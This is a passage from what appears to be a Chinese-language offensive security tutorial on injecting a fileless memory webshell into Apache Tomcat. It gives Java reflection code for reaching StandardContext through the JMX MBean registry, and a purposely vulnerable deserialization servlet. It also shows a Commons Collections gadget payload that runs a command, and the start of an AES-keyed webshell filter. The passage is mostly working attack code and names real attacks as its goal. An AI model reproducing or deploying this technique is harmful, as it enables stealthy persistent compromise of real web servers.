                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
            return method;
        }
        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
            Field f = null;
            if (obj instanceof Field) {
                f = (Field)obj;
            } else {
                f = obj.getClass().getDeclaredField(fieldName);
            }
            f.setAccessible(true);
            f.set(obj, value);
        }
        public static Object getFieldValue(Object obj, String fieldName) throws Exception {
            Field f = null;
            if (obj instanceof Field) {
                f = (Field)obj;
            } else {
                Method method = null;
                Class cs = obj.getClass();
                while(cs != null) {
                    try {
                        f = cs.getDeclaredField(fieldName);
                        cs = null;
                    } catch (Exception var6) {
                        cs = cs.getSuperclass();
                    }
                }
            }
            f.setAccessible(true);
            return f.get(obj);
        }
        private void transform(Object standardContext, String path) throws Exception {
            Object containerBase = this.invoke(standardContext, "getParent", (Object[])null);
            Class mapperListenerClass = Class.forName("org.apache.catalina.connector.MapperListener", false, containerBase.getClass().getClassLoader());
            Field listenersField = Class.forName("org.apache.catalina.core.ContainerBase", false, containerBase.getClass().getClassLoader()).getDeclaredField("listeners");
            listenersField.setAccessible(true);
            ArrayList listeners = (ArrayList)listenersField.get(containerBase);
            for(int i = 0; i > domainTb = (HashMap>)field.get(repository);
    Object aaa = domainTb.get("Catalina");
我们用JConsole打开Tomcat的mbeans，很多，
我们的目的是从中获取StandardContext，先看看能不能直接获取到
tomcat源码中全局搜索 name="StandardContext" 我们是可以定位到StandardContext
但是获取失败.....
猜测可能是默认没有注册，domainTb.get("Catalina")中并没有查找到，放弃直接获取，
然后考虑获取其它已经注册的类，再反射获取属性。
这里我们打印出所有Catalina下已经注册的类
    HashMap aaa = (HashMap) domainTb.get("Catalina");
    Iterator it = aaa.keySet().iterator();
    while(it.hasNext()) {
        String key = it.next();
        System.out.println(key + " : " + aaa.get(key));
    }
    NamedObject test = domainTb.get("Catalina").get("context=/,host=localhost,name=StandardContext,type=Context");
    System.out.println("aaaa");
大概看了下，这几个类通过链式方式可以获取到StandardContext
  * context=/bx_test_war_exploded,host=localhost,name=NonLoginAuthenticator,type=Valve
  * context=/bx_test_war_exploded,host=localhost,name=StandardContextValve,type=Valve
  * context=/manager,host=localhost,name=BasicAuthenticator,type=Valve
  * ...
拿NonLoginAuthenticator举例，获取StandardContext
NonLoginAuthenticator继承了AuthenticatorBase，其中的context属性，在实际运行中为我们想要的StandardContext
    NamedObject nonLoginAuthenticator = domainTb.get("Catalina").get("context=/bx_test_war_exploded,host=localhost,name=NonLoginAuthenticator,type=Valve");
成功反射获取context
这里停一下我们观察下这个key
context=/bx_test_war_exploded,host=localhost,name=NonLoginAuthenticator,type=Valve
context是项目名称，host是localhost，在实际攻击中， **这两个变量把我们并不确定** ，可以试着猜一下。不过有一点幸运的是，Tomcat
7，8，9都存在NonLoginAuthenticator
**我们尝试将内存马注入的payload合入到CC中**
首先我们自己写一个反序列化的漏洞
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            String base64_ser = request.getParameter("ser");
            BASE64Decoder  decoder = new BASE64Decoder();
            byte[] ser_bytes = decoder.decodeBuffer(base64_ser);
            ByteArrayInputStream bis = new ByteArrayInputStream (ser_bytes);
            ObjectInputStream ois = new ObjectInputStream (bis);
            ois.readObject();
        }catch (Exception e){
            e.printStackTrace();
        }
        System.out.println("22222222222222222222222222222222222222");
        PrintWriter out = response.getWriter();
        out.println("hello world");
    }
    String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
    InvocationHandler obj = cc3.getobject(cmd);
    hello.deserializeToObject(hello.serializeToString(obj));
反序列化demo环境测试通过
接下来我们将webshell的测试代码合入到CC中
Myfilter代码如下
    import javax.crypto.Cipher;
    import javax.crypto.spec.SecretKeySpec;
    import javax.servlet.*;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpSession;
    import java.io.IOException;
    import java.lang.reflect.Method;
    //@WebFilter(filterName = "all_filter")
    public class MyFilter_old implements Filter {
        String k="1a1dc91c907325c6";
        public MyFilter_old(String key){
            this.k = key;
        }
        public void destroy() {
        }
        public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException {
            System.out.println("filter被执行了....\n");
            try{
                if (true) {